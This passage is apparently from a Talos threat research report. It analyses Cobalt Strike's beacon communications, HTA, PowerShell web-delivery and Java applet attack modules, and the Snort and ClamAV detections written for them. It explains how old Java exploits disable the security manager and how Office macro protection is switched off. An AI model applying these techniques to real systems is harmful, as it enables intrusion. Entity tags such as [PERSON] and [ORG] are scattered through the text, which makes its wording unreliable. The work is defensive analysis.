named pipe and data needs to be decrypted just like a staged payload . This payload in particular is larger than [CARDINAL] 200KB.However , once the final payload is decoded , it needs to be loaded into memory . This is performed using a technique called Reflective DLL loading \u2014 the process of loading a library from memory into a host process . An executable needs to access various resources to function correctly . It needs to know its base address in memory and have valid headers and a fully built import address table . This is how an executable knows where to call functions such as LoadLibrary or GetProcAddress . Once the reflective loader has rebuilt the necessary sections and relocated the image , we \u2019ll see the actual path of execution . Once we unpack beacon.dll , we can dump it to disk and see the final artifact . Beacon configuration Cobalt Strike configuration is marked in the executable by patterns that allow us to parse it directly out of an unpacked beacon [ORG] DLL . The configuration is [PERSON] XOR encrypted , but by default , use a static XOR key for each respective beacon version ( [CARDINAL] 3 or 4).Figure [CARDINAL] 14 shows a decrypted [PERSON] Cobalt [PERSON] Strike configuration from the unpacked [FAC] Cobalt [FAC] Beacon . C2 COMMUNICATIONHeartbeat An infected host will reach out to the Cobalt Strike C2 server periodically with a heartbeat , sending basic metadata back home and gathering any commands issued by an operator . When a command is requested to be executed on the host , it \u2019s queued up and waits for that host to reach out.talos-external@cisco.com | talosintelligence.compage [CARDINAL] 10 of 29Figure 15Figure 16Figure 17Figure 15 shows the heartbeat.payload in the HTTP 200 OK ( Figure [CARDINAL] 16).It looks pretty benign , but all the metadata is stored in the HTTP cookie . We ca n\u2019t simply gain access to that data by base64 - decoding the cookie , since [PERSON] Cobalt [PERSON] Strike heartbeat data is encrypted . Cobalt Strike uses [ORG] RSA with [ORG] PKCS1 padding to encrypt the data prior to sending it back home . [PERSON] Talos researchers extracted the private / public key directly from the teamserver running on a virtual machine , something that would n\u2019t be possible outside of an isolated research environment . Tasks Now that we understand the heartbeats , let \u2019s look at the exchange for tasking a beacon . When a task is not available , the server will respond with another encryptedWhen configured , the response payload is an encrypted task . Cobalt Strike uses AES-256 in CBC mode with HMAC- SHA-256 to encrypt task commands . The [ORG] AES key can be found in the beacon metadata we decrypted earlier . It is calculated using the [ORDINAL] first [CARDINAL] 16 bytes of the decrypted metadata . Callbacks After execution , the host calls back to the C2 server . This time , the default configuration was an [ORG] HTTP [ORG] POST containing another encrypted payload ( Figure 17).The [ORDINAL] first [CARDINAL] four bytes are the size of the encrypted payload so we skip those when decrypting.talos-external@cisco.com | talosintelligence.compage [CARDINAL] 11 of [CARDINAL] 294 bytes - Counter 4 bytes - Data Size 4 bytes - Type of callbackThe structure of the data observed is : Figure [CARDINAL] 18 is a decrypted [WORK_OF_ART] Process [WORK_OF_ART] List callback . Detection Based on these actions , we wanted to write detection that would catch a Cobalt Strike stager being downloaded before it can target anything else . Catching the stager is pivotal , as it is most likely to prevent infection . Once the stager traverses into memory , it reflectively loads the final beacon payload and becomes harder to deal with . Researchers [ORDINAL] first generated every variant possible and created PCAPs of the stager traversing over typical ports seen in file - data traversal . Once again , we triggered the [GPE] Metasploit shellcode rules for every payload when we checked prior coverage : \u20221:30229 INDICATOR - SHELLCODE Metasploit windows/ shell stage transfer attempt 1:30471 INDICATOR - SHELLCODE Metasploit payload windows_adduser 1:30480 INDICATOR - SHELLCODE INDICATOR - SHELL- CODE [GPE] Metasploit payload windows_x64_meterpret- er_reverse_https\u2022\u2022Figure 18The approach here was to once again find a unique set of instructions that can be associated with Cobalt Strike beacons while avoiding false positives . It was pretty difficult to find a good match in the stageless beacons , but the function in Figure [CARDINAL] 19 sparked our interest . Since we confirmed these rules provide coverage , we can move onto the core stageless beacon . This function is pretty simple \u2014 its purpose is to parse the [ORG] DOS header and check for the correct file magic signature . Figure [CARDINAL] 19 : A function inside a stageless [PERSON] Cobalt [PERSON] Strike beacon.talos-external@cisco.com | talosintelligence.compage [CARDINAL] 12 of 29If it exists , it jumps to the IMAGE_NT_OPTIONAL header and checks the magic there . After comparison , the [ORG] AL byte is set to reflect the correct architecture . This is used for further processing of the file header . A quick run in [GPE] Snort showed that this alerted on every single beacon we generated . This does n\u2019t look malicious on the surface , so researchers ran this function with multiple preceding NOPs through false - positive testing . Expectations were not high , but we could n\u2019t find a single false positive . This was n\u2019t the case prior to adding in the extra alignment bytes . Either [ORG] NOP was less commonly used for alignment in modern compilers , or we were extremely lucky . Regardless , we had performed enough due diligence in testing to give the rule a [GPE] shot.\u2022The result was [CARDINAL] four rules that are still going strong to [DATE] this [DATE] day . \u2022 1:53656 MALWARE - OTHER [ORG] Cobalt Strike x86 [TIME] execut- able download attempt [CARDINAL] 1:53657 MALWARE - OTHER Cobalt Strike x86 [TIME] execut- able download attempt 1:53658 MALWARE - OTHER [ORG] Cobalt Strike x64 [TIME] execut- able download attempt 1:53659 MALWARE - OTHER [PERSON] Cobalt [PERSON] Strike x64 [TIME] execut- able download attempt\u2022\u2022Figure 20Figure 21Figure 22TARGET MODULE : HTML APPLICATION ATTACK GENERATOR The focus of this attack generator is to generate an [ORG] HTML [ORG] Application ( [ORG] HTA ) , a file extension for the [ORG] HTML executable file format and typically consists of [ORG] HTML / Dynamic [ORG] HTML and a scripting language of choice . [ORG] HTA files behave like executables . They are popular among attackers because they run as a fully trusted application in certain cases . When using the HTML Application Attack generator the user can select a Cobalt Strike listener as usual and the method , including executable , [ORG] PowerShell and [NORP] VBA.These methods do not determine the scripting language used in the [ORG] HTA files . In all methods , [ORG] VBScript is used to deliver the desired payload in the [ORG] HTA file . The method , however , changes the payload type and how it is executed on the host . Let \u2019s take a look at each of them . Executable The executable method ( Figure [CARDINAL] 20 ) is a straightforwardattack , as it is simply designed to load a large [ORG] ASCII hex string and execute it on the host . The shellcode is loaded by creating a ` Scripting . FileSystemOjbect ` and using that to create a temporary file on the host . After initializing the temporary file , the shellcode stream is converted from hex string to bytes and written to the file ( Figure 18).Finally , the file is executed using a [LOC] WScript . [ORG] Shell object and the temporary file and folder are deleted to cover its tracks ( Figure [CARDINAL] 21).PowerShell The [ORG] Powershell method is relatively naive at [ORDINAL] first glance , as it once again uses the [LOC] WScript . [ORG] Shell object to invoke [ORG] PowerShell . This time , rather than creating a temporary executable file , it simply runs powershell with a large base64 - encoded command ( Figure [CARDINAL] 22).We base64 decode the command , which results in a unicode string containing additional [ORG] PowerShell and another base64 blob . Here , we can start to see the desired path totalos-external@cisco.com | talosintelligence.compage [CARDINAL] 13 of 29Figure 23infection , as it takes the [ORDINAL] second base64 blob and is creating an ` IO.MemoryStream ` object out of it . A quick look at the resulting code shows that we , once again , jumped the gun in analysis and it \u2019s gzip compressed . We can quickly decompress the extracted data on the [ORG] CLI ( Figure [CARDINAL] 23).`func_get_proc_address ( ) ` ` func_get_delegate_type()`The newly decoded payload declares some new functions . This is a fairly old technique ( around 2012 ) that allows the user to invoke calls via .NET native method wrappers in [ORG] PowerShell . This allows the user to call the Windows API using and execute code in a fileless manner via the ` System . Reflection ` namespace . We can then use`GetMethod ( ) ` to acquire a handle to the desired functionality and bypass any restrictions . The goal in this payload is to expose the ` GetProcAddress ` library function so that we can load the desired Windows API code and interact with it . System . Reflection exposes another function called ` GetDeletegateForFunctionPointer ` . Using this , [PERSON] Cobalt [PERSON] Strike grabs a function pointer to any API function it needs for execution . Once an executable section of memory is allocated andFigure [CARDINAL] 24Figure 25populated Cobalt Strike can then execute the payload in memory through another delegate defined for the memory region . So what is the base64 string this time ? It \u2019s shell code , but actually [PERSON] XOR encrypted ( Figure 24).This is pretty easy to decrypt . We know that it \u2019s XOR\u2019d using the key 0x23 ( 35 ) so we can decode this using our method of choice . In this case , we used ` xortool - xor ` ( Figure [CARDINAL] 25)Eventually , we determined that this is the same code as seen in the raw payload section in different packaging . Once Cobalt Strike gets it right , it reuses that work across other attack options . This makes it more convenient for defenders to write detection.talos-external@cisco.com | talosintelligence.compage [CARDINAL] 14 of 29Figure 26VBA The [ORG] VBA [ORG] Method gives a little bit of a different approach ( Figure [CARDINAL] 26).So far , we \u2019ve seen basic methods of loading binary code and executing it . In this method , we can see that it uses [PRODUCT] an [PRODUCT] Excel [PRODUCT] Workbook to execute additional code . The [ORDINAL] first thing that happens is [PERSON] Cobalt [PERSON] Strike loads up an ` [PRODUCT] Excel . Application ` and then queries a registry key:`HKEY_CURRENT_USER\\Software\\Microsoft\\ Office\\<Excel Version>\\Excel\\Security\\AccessVBOM\\`This key is a security setting for restricting default programmatic access to the [ORG] Office [ORG] VB project . If it \u2019s enabled , [ORG] Office will trust all macros and run any code without a security warning or additional permissions from the user . Cobalt Strike attempts to flip that switch anddisable this protection in the registry . After that , Cobalt Strike once again calls the Windows API to execute binary code . Then , it allocates an executable section of memory within the process and runs it by calling ` kernel32.dll!CreateRemoteThread` . Detection This type of multilayer obfuscation is easy to extract when in hand but can be extremely effective against security products that do n\u2019t know it \u2019s coming . But it \u2019s possible to work around this . For the executable method , the shellcode was actually the same assembly code as what we discussed earlier in the Staged / Stageless Executables . The [ORG] NOP - based function is interpreted as a hex string , so we can clone those rules totalos-external@cisco.com | talosintelligence.compage [CARDINAL] 15 of 29match a hex string , rather than actual bytes . [PERSON] \u20221:54110 MALWARE - OTHER [PERSON] Html . Trojan . CobaltStrike HTML beacon download attempt 1:54111 MALWARE - OTHER [PERSON] Html . Trojan . CobaltStrike HTML beacon download attempt 1:54112 MALWARE - OTHER Html . Trojan . CobaltStrike HTML beacon download attempt [CARDINAL] 1:54113 MALWARE - OTHER [PERSON] Html . Trojan . CobaltStrike HTML beacon download attempt\u2022\u2022\u2022For the [ORG] PowerShell method , we have again a ton of obfuscated code underneath it , so the coverage should target generic function calls . For this , we went with the [ORG] PowerShell command arguments , and supplemented that with matching on a [NORP] Wscript . [ORG] Shell object being created . [PERSON] \u20221:54114 MALWARE - OTHER [PERSON] Html . Trojan . CobaltStrike powershell payload download attempt 1:54115 MALWARE - OTHER Html . Trojan . CobaltStrike powershell payload download attempt\u2022Lastly , we have [ORG] the [ORG] VBA [ORG] Method . Our researchers found this easy to cover because [ORG] HTA files do n\u2019t often interface with [PRODUCT] Excel workbooks , let alone one that tinkers with the \u201c AccessVBOM \u201d registry key . [PERSON] \u20221:54116 MALWARE - OTHER [PERSON] Html . Trojan . [PERSON] CobaltStrike [PERSON] VBA payload download attempt 1:54117 MALWARE - OTHER Html . Trojan . [PERSON] CobaltStrike [PERSON] VBA payload download attempt\u2022From there , we cloned all that to [ORG] ClamAV coverage to get the following signatures : \u2022 Html . Trojan . CobaltStrike-7932561 - 0 \u2022 Html . Trojan . CobaltStrike-7932562 - 0 \u2022 Html . Trojan . CobaltStrike-7932563 - 0 [ORG] \u2022 [ORG] Html . Trojan . CobaltStrike-7932564 - 0TARGET MODULE : SCRIPTED WEB DELIVERY In Cobalt Strike , there \u2019s a feature called \u201c scripted web delivery . \u201d Executing a scripted web delivery attack simply means that you pick one of the Cobalt Strike payloads/ listeners and Cobalt Strike will then host that payload at a user - configured [ORG] URI . These can be generated in [CARDINAL] three different languages : [PERSON] Bitsadmin , [ORG] PowerShell and Python . After hosting the payload , [PERSON] Cobalt [PERSON] Strike provides acommand that can be executed , in the language of choice , that reaches out and grabs the malicious payload from an attacker - controlled web server and executes it . We are only going to concentrate on the [ORG] PowerShell implementation , as it is the most commonly used module . The initial execution is using a web client to download an additional [ORG] PowerShell payload from the attacker controlled web server and then continue to execute that code . Payload After reaching out to grab the real payload , we get a huge obfuscated [ORG] PowerShell script from the web server , [CARDINAL] almost [CARDINAL] 200 [PERSON] KB in size . This script contained code reuse from the [ORG] HTA module , but we still needed to go one layer deeper and verify the shellcode was unique in this module . We base64 - decode the data and decrypt it using the same ` 0x23 ` default [PERSON] XOR key \u2014 and it \u2019s already much larger than the previous payload . It \u2019s not raw shellcode like we saw in the [ORG] HTA payloads , you can immediately see that the \u201c MZ \u201d header is present . This seems to be a stageless beacon included in the powershell script . You might wonder why it was n\u2019t included in the [ORG] HTA attack . The reason is the [ORG] HTA module is executing a [ORG] Powershell [CARDINAL] one - liner and [PRODUCT] Windows has a character limit on command line strings , [DATE] 32767 . That number is even lower when executing a command from ` cmd.exe ` , [DATE] 8191 . The character limit varies across a variety of execution methods and these numbers are not always going to be correct . Since this payload is downloaded using a small [CARDINAL] one - liner to execute a string retrieved from the Cobalt Strike controlled server , that limit is bypassed and a more reliable payload can be provided . Detection To detect something , we [ORDINAL] first have to narrow down what we can actually see in [GPE] Snort or [ORG] ClamAV . We are not able to deobfuscate a [ORG] PowerShell script coming across the network prior to detection \u2014 it \u2019s simply not feasible without introducing latency for the client in most cases . So , for detection , we are left with the initial obfuscated payload downloaded . That \u2019s not so bad because [PERSON] Cobalt [PERSON] Strike , in its current configuration , once again has atalos-external@cisco.com | talosintelligence.compage [CARDINAL] 16 of 29Figure 27Figure 28static format when generating the [ORG] PowerShell script . We know that in this instance , the code ` New - Object IO.MemoryStream(,[Convert ] : : FromBase64String ( ` following will always be present in a position relatively close to the start of the file . This gives us simple , but efficient , coverage using \u20221:53973 MALWARE - OTHER CobaltStrike PowerShell web delivery attempt [CARDINAL] 1:53974 MALWARE - OTHER CobaltStrike PowerShell web delivery attempt\u2022TARGET MODULE : SIGNED JAVA APPLET ATTACK The applets in this attack are self - signed , giving users limited options : a listener ( per usual ) , port , local host and the [ORG] URI it \u2019s hosted on . This will spawn a hosted [PERSON] Java [PERSON] Applet on a malicious Cobalt Strike web server to infect users . If a user gives an applet permission to run , infection will occur . Landing Page Upon visiting the page , the user sees a generic landing page that loads a malicious [ORG] JAR file , \u201c cross_platformi9.jar \u201d and applet class loaded is defined by the \u201c code \u201d parameter , \u201c Java.class \u201d ( Figure [CARDINAL] 27).The [ORDINAL] first thing that catches the eye is that [CARDINAL] two parameters are passed \u2014 \u201c i d , \u201d which contains a large base64 blob , and \u201c type \u201d which is set to \u201c theme . \u201d We can confirm this right off the bat by comparing the length of the raw HTTP beacon payload against the length of the decoded binary blob , both a total of [CARDINAL] 799 bytes . A [ORDINAL] second HTTP GET request is made for the [ORG] JAR file during the process of loading this applet . So that \u2019s the next step . Java archive ( [ORG] JAR ) [ORDINAL] First , we \u2019ll look at the [ORG] JAR file ( Figure [CARDINAL] 28).We have a few classes , and [CARDINAL] two DLLs named \u201c main.dll \u201d and \u201c main64.dll \u201d . You can also see the default signature filetalos-external@cisco.com | talosintelligence.compage [CARDINAL] 17 of [CARDINAL] 29(MYKEY.SF ) and [ORG] RSA certificate ( MYKEY.RSA ) used to sign the binary . Figure [CARDINAL] 29 shows us jusing jadx to decompile the source code . The base code called \u201c Java.class \u201d is n\u2019t complicated \u2014 it \u2019s an extension of \u201c Applet \u201d designed to spawn a thread . And the [PERSON] Base64.dll class is n\u2019t malicious , it handles base64 as expected.\u201cMain.class \u201d is fairly basic but shows us that a temporary file is created , named \u201c main.dll \u201d and writes data to that file from either the [ORG] main64.dll or main.dll file contained in the [ORG] JAR file based on the system architecture . The system property \u201c sun.arch.data.model \u201d is a simple method to return the system \u2019s word size , easily determining the architecture . Following this , the new [ORG] DLL file path is fed to ` System . load()` . Cobalt Strike uses [WORK_OF_ART] the [WORK_OF_ART] Java [WORK_OF_ART] Native [WORK_OF_ART] Interface ( JNI ) to perform injection . This is essentially the same as creating bindings to another program . It allows users to load a library into [ORG] the [ORG] Java [ORG] Virtual [ORG] Machine ( JVM ) and interact with it.Main.dll Since inject ( ) is called from the JNI with the shellcode blob , we can load this into [ORG] IDA and see an exposed function \u2014 ` Java_Main_inject()` . The handoff to ` Java_Main_inject ` is n\u2019t as straightforward as it would be passing a byte / character array in C / C++ . In this case the exported function looks a little like Figure [CARDINAL] 30 : The data is extracted from the JNI objects and then passed to the real ` inject ( ) ` function that spawns a new thread and resumes execution in the shellcode passed in from the \u201c i d \u201d parameter . Detection We need to isolate the things we want to cover and separate them from each other when evaluating multipleFigure 29levels of execution . Here , we can identify a few things . [CARDINAL] 1 . The landing page that spawns the malicious applet [CARDINAL] 2 . The [ORG] JAR file [CARDINAL] 3 . main.dll/main64.dll The landing page was fairly simple , as we already identified that the parameter is simply the raw payload from earlier . The [ORG] JAR files contain the same [ORG] DLL 32/64 bit and code every time but have a different name . This simplifies things as we target what we know is malicious in there . The last thing was the extracted [ORG] DLL , and our prior work paid off . We had prior coverage available from various x32/ x64 download rules we created researching the staged/ stageless beacons . TARGET MODULE : [ORG] SMART JAVA APPLET ATTACK The Smart Java [PERSON] Applet [PERSON] Attack is very similar to [ORG] Signed [ORG] Applets in execution . Instead of just running raw shell code , though , it attempts to gain execution through various [PERSON] Java exploits . It is deemed \u201c [ORG] Smart \u201d as it determines what exploit to use based on the version of Java the victim host is running . Landing Page The landing page is for the most part the same as Signed Applet Attacks . It spawns a malicious page on the default [ORG] URI , \u201c /SiteLoader . \u201dOnce again , there \u2019s a base64 blob containing the \u201c id\u201dFigure [CARDINAL] 30talos-external@cisco.com | talosintelligence.compage [CARDINAL] 18 of 29parameter and a \u201c type \u201d parameter with the value \u201c os . \u201d The payload is slightly different , however , since it uses the same shellcode stub . We already know what this does for the most part , so we \u2019ll skip further analysis . [PERSON] Java [PERSON] Archive Per the Cobalt Strike official documentation , we can get a brief understanding of this module \u2019s goal . \u2022The smart applet analyzes its environment and decides which [PERSON] Java exploit to use . If the [PERSON] Java version is vulnerable , the applet will disable the security sandbox , and spawn a session using [ORG] Cobalt [ORG] Strike \u2019s [ORG] Java injector . These exploits in this attack work against Java 1.7u21 and older . Java 1.6u45 and older is also vulnerable to this attack.\u2022The exploits used are not specified however , we know it affects the [PERSON] Java versions shown in Figure [CARDINAL] 31 . Since we do n\u2019t know what exploits it \u2019s using already , we must look closer . There are a lot more classes shown in Figure [CARDINAL] 32 , but we can see that main.dll/main64.dll are still included . A quick ` sha256sum ` reveals that these are the same DLLs included in the Signed Applet Attack module . We once again can decompile the jar using ` jadx ` as we did in the Signed Applet Attack . The decompilation was not clean as we receive [CARDINAL] one error for an unknown instruction , \u201c invoke - polymorphic \u201d . This instruction is not currently supported in jadx , so we will just ignore it for now and start looking at ` [PRODUCT] JavaApplet . class ` in Figure 31.This class directs execution based onFigure [CARDINAL] 31Figure [CARDINAL] 32the version of [PERSON] Java installed , here we can identify how it targets each version . The code polls \u201c java.version \u201d via a call to System.getProperty to get the [ORG] JRE version installed , if any . Following that it is matched against the [ORG] PCRE ` [CARDINAL] 1.(\\d+).0_(\\d+ ) ` . The important thing with this [ORG] PCRE is that it has [CARDINAL] two capture groups that retrieve major and minor [PERSON] Java versions for further processing . It \u2019s important to understand the structure of [PERSON] Java version strings . [ See url javase / versioning - naming.html ] . \" [CARDINAL] 1.<Major Version>.0_<Update Release>\"When the version string for the product is reported as \u201c java version [CARDINAL] 1.8.0_5 \u201d , the product will be called JDK 8u5 , JDK [CARDINAL] 8 update 5 or , when the update version is nottalos-external@cisco.com | talosintelligence.compage [CARDINAL] 19 of [CARDINAL] 29Figure 33important , JDK [CARDINAL] 8.bit in the next section . We discovered this module exploits multiple vulnerabilities . The [PERSON] Java execution flow is as follows : If the regex fails and the version string is equal to \u201c [CARDINAL] 1.7.0 \u201d also direct execution to ` Rhino()`<= Java 6u27 - > ` Rhino ( ) ` < = Java 6u45 - > ` [ORG] AppIcon ( ) ` = = Java 7u0 - > ` Rhino ( ) ` < = Java 7u6 - > ` Exec ( ) ` < = Java 7u21 - > ` Bean()`Main.java Main.java contains the same code as we saw in the Signed Applet attack . Its sole purpose is to run main.dll , or [PERSON] main64 . dll , with the shellcode provided in the \u201c i d \u201d parameter by interfacing with the JNI . We will touch on how this works aCVE-2011 - 3544 - Oracle Java applet rhino script engine remote code execution [ORG] Java [ORG] Version < = [CARDINAL] 1.6.0_27 or [ORG] Java [ORG] Version = = 7.0This class is associated with the Rhino Script Engine which is used to run arbitrary code outside of the [PERSON] Java sandbox . This was dangerous at [CARDINAL] one point in time because these [ORG] JavaScript objects were not controlled by the [PERSON] Java [PERSON] SecurityManager . Protections were put in place to limit attempts to execution however it was determined that you bypass the sandbox limitations by storing [PERSON] Java code in a string and then executing it . When executing the ` toString ( ) ` method , it returns a [PERSON] Java function in the context of the caller ( Figure [CARDINAL] 33).So if we are restricted by the permissions of the caller , we are still limited in execution privileges . Instead , wetalos-external@cisco.com | talosintelligence.compage [CARDINAL] 20 of 29Figure 34Figure 35need to generate an error object containing the code as its message . This module extends the [ORG] Main class . When spawning a thread of itself , it will look to see if the class implemented ` [WORK_OF_ART] Runnable ` and the ` run ( ) ` function , which ` Main ` does . This means that the goal is to spawn main.dll with desired shellcode but from outside the sandbox . CVE 2013 - 2465 - Oracle Java [CARDINAL] 2D [ORG] ImagingLib remote code execution [ORG] Java [ORG] Version < = 1.6.0_45This vulnerability exploits a vulnerability when filtering ( ) BufferedImage \u2019s using ` AffineTransformOp` . [ORDINAL] First , some necessary helper classes are defined to assert certain behavior later down the road , \u201c ComponentColorModel \u201d and \u201c ICC_ColorSpace \u201d ( Figure [CARDINAL] 34).Figure [CARDINAL] 35 shows a defined [PERSON] ColorComponentModel thatis supplied to the ` BufferedImage ` constructor to fool a specific check within ` storeImageArray ( ) ` . That check is for ` ( hintP->packing = = BYTE_INTERLEAVED ) ` . When this check succeeds , data is written back to the destination . The [ORDINAL] second class defines a ComponentColorModel that will always return ` True ` when calling ` isCompatibleRaster()` . Now to prepare an exploit , we move to ` loadIcon ( ) ` . [ORDINAL] First , we need to prepare the necessary objects for execution . The order of the following allocations is extremely important as we want them to be aligned in memory ( Figure 35).To get a better understanding of [PERSON] Java access control security . A ` Statement ` object can represent arbitrary method calls . When an instance of ` Statement ` is created , the current security context is stored in ` [ORG] Statement.acc ` . When calling ` execute ( ) ` on that statement , [PERSON] Java attempts to verify that thetalos-external@cisco.com | talosintelligence.compage [CARDINAL] 21 of [CARDINAL] 29permissions surrounding that call have not been changed by looking at the value of ` Statement.acc ` . Therefore the goal of this exploit is to gain the correct permissions on ` System . setSecurityManager ( ) ` to disable it by overwriting it \u2019s ` AccessControlContext ` . To prepare for that , a new ` Permissions ` object is created with ` AllPermission ( ) ` ( Figure [CARDINAL] 36).Now , comes CVE-2013 - 2465 ( Figure [CARDINAL] 37).Two ` BufferedImage ` are created . The [ORDINAL] second uses the dataBufferByte [ ] object we declared earlier . A raster is created with a ` dataBitOffset ` that points outside of the ` dataBufferByte[16 ] ` memory structure . [ORG] CobaltStrike then sets the [ORDINAL] first pixel to ` [CARDINAL] 0xFFFFFFFF ` . Finally , the vulnerable storeImageArray ( ) call through filter ( ) is performed and data is written back to the object and corrupts the adjacent object \u2019s length . Cobalt Strike can now loop through ` [ORG] iArr [ ] ` until it finds the default ` [ORG] Statement.acc ` field and overwrite it with the ` [ORG] AllPermission ` object created earlier . Now , ` setSecurityManger ` can be executed with the necessary permissions to disable it and run shellcode . CVE-2012 - 4681 - Oracle Java [CARDINAL] 7 SunToolkit Remote Code Execution Java Version < = [CARDINAL] 1.7.0_6This vulnerability exploits the [PERSON] Java ` Class.forName ( ) ` or ` ClassFinder ` to gain access to private object fields . In the context of [ORG] CobaltStrike , this resolves around calls to ` [PERSON] SetField ( ) ` from ` sun.awt . SunToolkit ` . Originally in Java 6 , this was not possible as we were n\u2019t allowed to gain a reference to ` sun.awt . SunToolkit ` . In Java [CARDINAL] 7.0_6 , this changed and introduced CVE - Figure [CARDINAL] 36Figure [CARDINAL] 372012 - 4681.`check ( ) ` ` [PERSON] SetField ( ) ` ` GetClass()`There are [CARDINAL] three main methods to this class . Check ( ) is the [ORDINAL] first function executed in the exploit and the execution path is pretty simple . As we saw in CVE-2013 - 2465 , a [ORG] Statement object is created for ` setSecurityManager ( ) ` , along with a new permissions object . The next operation is a call to ` sf ( ) ` , short for ` [PERSON] SetField ( ) ` , private class method with the statement class type , the desired field \u201c acc \u201d , our Statement object , and the new permissions we want . ` Sun.awt . SunToolkit ` is a restricted class for untrusted code , normally you would n\u2019t be able to gain access in our current security context.talos-external@cisco.com | talosintelligence.compage [CARDINAL] 22 of [CARDINAL] 29An adversary could exploit this vulnerability by calling ` Class.forName ( ) ` as the target method of the [LOC] Expression . In reality , ` forName ( ) ` is not called . Instead , ` Expression ` uses custom logic to load classes without verifying permissions . Without ` Expression ` , this would not be possible . After returning to ` [PERSON] SetField ( ) ` with our privileged class access , the [ORDINAL] second issue is exploited to gain access to a private field . An adversary could go on to disable the security manager and execute arbitrary shellcode . CVE-2013 - 2460 - Oracle [PERSON] Java [PERSON] ProviderSkeleton invoke ( ) remote code execution [ORG] Java [ORG] Version < = 1.7.0_21This exploit involves gaining access to a restricted package through a public interface . [PERSON] Bean [PERSON] BeanHelper [PERSON] BeanProviderThis exploit can be found in : The ` com.sun.tracing . Provider ` and ` java.lang.reflect . InvocationHandler ` are the main culprits here . This gives access to a ` Provider ` interface , or ` [PRODUCT] ProviderSkeleton ` , and provides the base for the target ` invoke ( ) ` function . This starts obtaining a lookup method by creating an [PERSON] Invocationhandler via ` java.lang.reflect . [PERSON] Proxy ` . From there , the exploit can obtain a reference to ` MethodHandles . lookup ` and call it via the [ORG] InvocationHanlder defined earlier . This is most of the work needed to begin exploitation , access to the ` invoke ( ) ` method is already provided . But how does that give an attacker an opportunity to elevate privileges ? The invoke method , in [PERSON] Java [PERSON] 7u21 , does not perform any checks on whether or not a public method should be accessible by the calling class . See the openjdk commit in [GPE] Figure 38.Figure 38Figure [TIME] 39The [TIME] second issue is that in this case , ` invoke ( ) ` does not return the calling blass but instead returns ` sun.tracing . ProviderSkeleton ` . This all comes together because ` ProviderSkeleton ` is a privileged class . Eventually , [PERSON] Cobalt [PERSON] Strike loads several classes and , once again , disables the manager . [PERSON] Cobalt [PERSON] Strike now uses the ` displayAd ( ) ` ( Figure [CARDINAL] 39 ) to make calls to invoke ( ) and return privileged classes that they would otherwise not have access to . You can see another call to ` getMethod ( ) ` prior to invoking the argument , this function is used to obtain access to the familiar ` forName ( ) ` method . Then once again like earlier , that can be called to gain access to restricted classes ( Figure [CARDINAL] 40).Figure 40talos-external@cisco.com | talosintelligence.compage 23 of 29`sun.org.mozilla.javascript.internal . Context ` ` sun.org.mozilla.javascript.internal . DefiningClassLoader ` ` sun.org.mozilla.javascript.internal . GeneratedClassLoader`Next , [CARDINAL] three restricted classes are loaded : This is now used to load the ` BeanHelper ( ) ` class included with [ORG] the [ORG] Smart [ORG] Applet and execute it under a privileged context by calling ` AccessController.doPrivileged ( ) \u2019 , as shown in Figure [CARDINAL] 41.And the security manager is disabled again . Figure [CARDINAL] 41Detection The amount of devices running [PERSON] Java is astoundingly high still in [DATE] 2020 . It still continues to be a widely used language and commonly installed utility for users . These vulnerabilities are pretty old , but for the Smart Applet to be effective , the amount of vulnerable devices is likely still high enough to warrant them being included . Now , detection here was the easiest part . Remember how the landing page was extremely similar to the Signed Applet module ? Additionally , main.dll/main64.dll is again included in the Smart Applet JAR . We already covered it with the same detection . Case closed on some old [PERSON] Java vulnerabilities with prior coverage . TARGET MODULE : SYSTEM PROFILER This module is designed to perform reconnaissance on systems visiting a Cobalt Strike - controlled web server . It is important to note that this module is not intended to infect a host , but rather supply information on the operating system and applications installed on a target . Payload When an operator configures the system profiler , there are [CARDINAL] two options for gathering the desired information . The [ORDINAL] first one utilizes a large [ORG] JavaScript file that leverages multiple ActiveX controls to gather information . The [ORDINAL] second is an optional [PERSON] Java [PERSON] Applet , a common theme we \u2019ve seen in [GPE] Cobalt [GPE] Strike , to supply additional information on top of the [ORG] JS . The final configuration option is a redirect . This makes the victim client redirect to another page after performing profiling the system . The initial landing page for the system profiler delivers a page with code similar to Figure [CARDINAL] 42 : Let \u2019s glance over both types for a high - level overview . [PERSON] Java [PERSON] Applet The initial landing page checks to see if [PERSON] Java is installed and enabled in [CARDINAL] two different ways . [ORDINAL] First , it uses ` deployJava . geJREs ( ) ` to return an array of installed versions , or an empty array if not present . The [ORDINAL] second is ` navigator . Figure [CARDINAL] 42talos-external@cisco.com | talosintelligence.compage [CARDINAL] 24 of 29Figure 43Figure 44javaEnabled ( ) ` which is a simple boolean \" True \" or \" False\" . [PERSON] Java is installed if either check succeeds . The Java Applet , \u201c iecheck.class , \u201d runs on the page , as shown in Figure [CARDINAL] 43.The class contains a small code base that only has [CARDINAL] two functions . [CARDINAL] One is designed to return the version of [PERSON] Java , the client is running . The other is a little more tricky and is geared toward exposing the internal [ORG] IP address of the client . JavaScript The [ORG] JavaScript is the bulk of the profiler and a huge file weighing in at [CARDINAL] over [CARDINAL] 200 [ORG] KB and [CARDINAL] almost [CARDINAL] 5,000 lines of code ( after beautifying it ) . It checks browser versions , system information and installed applications through [ORG] JavaScript and ActiveX calls . Some of the checks include but are not limited to web browser , operating system , [PERSON] Adobe [PERSON] Acrobat , [PERSON] Adobe [PERSON] Flash and more . It also includes another attempt to get the internal [ORG] IP address of the client , just like [FAC] the [FAC] Java [FAC] Applet . Detection Detection here is pretty straightforward . Since the profiler is trying to do so much at once , we can make quick work on the landing page by checking HTTP responses . We want to look for any abnormal combination of application version checks by using ActiveX control class IDs and object names , static version checks , and attempts to load a [PERSON] Java applet . We can also look for attempts to store data within a 1x1 ( width x height ) element named ` checkip`.talos-external@cisco.com | talosintelligence.compage [CARDINAL] 25 of 29Generally speaking , it \u2019s the easiest way to catch communication in the response from the client . At the end of the \u201c check.js \u201d file , we see an attempt to make an [ORG] HTTP [ORG] POST request back to the server with whatever information was collected ( Figure 44).We can see that the client data section of the HTTP post contains the parameters and values sent to the ` application ( ) ` function . This left us with the following detection : Snort \u20221:13913 BROWSER - PLUGINS AcroPDF.PDF ActiveX clsid access attempt 1:23878 BROWSER - PLUGINS Oracle JRE Deployment Toolkit ActiveX clsid access attempt 1:38038 POLICY - OTHER [ORG] PDF ActiveX CLSID access detected 1:54180 MALWARE - OTHER Cobalt Strike system profil- ing attempt [CARDINAL] 1:54181 MALWARE - OTHER [ORG] Cobalt Strike system profil- ing attempt\u2022\u2022\u2022\u2022\u20221:54182 MALWARE - OTHER Cobalt Strike system profil- ing attemptClamAV \u2022Java . [ORG] 